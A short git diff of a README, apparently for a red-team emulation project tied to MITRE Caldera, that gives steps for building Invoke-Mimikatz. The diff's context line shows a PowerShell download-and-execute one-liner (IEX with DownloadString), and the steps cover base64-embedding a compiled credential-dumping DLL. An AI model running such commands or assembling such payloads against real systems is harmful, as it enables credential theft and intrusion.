@@ -25,7 +25,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 4. Open the project in VSCode.
 5. Select "Second_Release_PowerShell" and build the project.
 6. Base64 encode `Win32/powerkatz.dll` and `x64/powerkatz.dll`.
-7. Replace the content of the `PEBytes64` and `PEBytes32` variables with base64 encoded payloads.
+7. In `Invoke-Mimikatz.ps1`, replace the content of the `PEBytes64` and `PEBytes32` variables with base64 encoded payloads.
 
 ## References
 - https://github.com/mitre/caldera/issues/38
